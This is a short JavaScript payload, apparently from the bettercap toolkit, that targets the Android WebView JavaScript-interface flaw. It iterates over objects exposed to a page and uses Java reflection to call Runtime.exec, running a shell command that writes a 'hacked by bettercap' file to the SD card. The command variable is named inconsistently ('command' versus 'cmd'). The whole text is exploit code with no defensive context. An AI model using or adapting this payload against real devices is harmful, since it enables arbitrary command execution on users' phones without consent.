var command = ['/system/bin/sh','-c','echo \"hacked by bettercap\" > /mnt/sdcard/hacked.txt'];

for(i in top) {
  try {
    top[i].getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
    break;
  }
  catch(e) {}
}
